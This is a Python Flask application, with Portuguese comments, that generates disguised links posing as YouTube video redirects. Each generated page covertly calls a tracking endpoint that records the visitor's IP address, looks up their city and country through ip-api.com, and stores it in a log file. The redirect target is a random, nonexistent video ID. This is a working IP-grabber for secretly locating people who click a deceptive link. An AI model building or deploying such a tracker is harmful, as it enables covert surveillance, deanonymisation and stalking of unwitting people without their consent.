from flask import Flask, request, render_template, jsonify, redirect
import os
import json
import uuid
import datetime
import requests

app = Flask(__name__)

LOG_FILE = 'logs.json'
GENERATED_FOLDER = os.path.join('templates', 'generated')
if not os.path.exists(GENERATED_FOLDER):
    os.makedirs(GENERATED_FOLDER)

@app.route('/')
def index():
    logs = []
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, 'r') as f:
            logs = json.load(f)
    return render_template('index.html', logs=logs)

@app.route('/gerar_link', methods=['POST'])
def gerar_link():
    video_id = uuid.uuid4().hex[:11]
    youtube_url = f"https://www.youtube.com/watch?v={video_id}"
    tracking_id = uuid.uuid4().hex

    # HTML gerado com redirecionamento
    html_content = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <meta http-equiv="refresh" content="2;url={youtube_url}" />
        <script>
            fetch("/track/{tracking_id}")
        </script>
    </head>
    <body>
        <h1>Redirecionando para o vídeo...</h1>
    </body>
    </html>
    """

    path = os.path.join(GENERATED_FOLDER, f"{tracking_id}.html")
    with open(path, 'w') as f:
        f.write(html_content)

    full_link = request.host_url + f"generated/{tracking_id}"
    return jsonify({"link": full_link})

@app.route('/generated/<tracking_id>')
def serve_generated(tracking_id):
    return render_template(f"generated/{tracking_id}.html")

@app.route('/track/<tracking_id>')
def track(tracking_id):
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)

    try:
        location_data = requests.get(f"http://ip-api.com/json/{ip}").json()
        location = f"{location_data.get('city')}, {location_data.get('regionName')} - {location_data.get('country')}"
    except Exception:
        location = "Desconhecida"

    log = {
        "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "ip": ip,
        "location": location,
        "id": tracking_id
    }

    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, 'r') as f:
            dados = json.load(f)
    else:
        dados = []

    dados.append(log)

    with open(LOG_FILE, 'w') as f:
        json.dump(dados, f, indent=4)

    return '', 204

@app.route('/get_logs')
def get_logs():
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, 'r') as f:
            dados = json.load(f)
    else:
        dados = []
    return jsonify(dados)

if __name__ == '__main__':
    import os
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
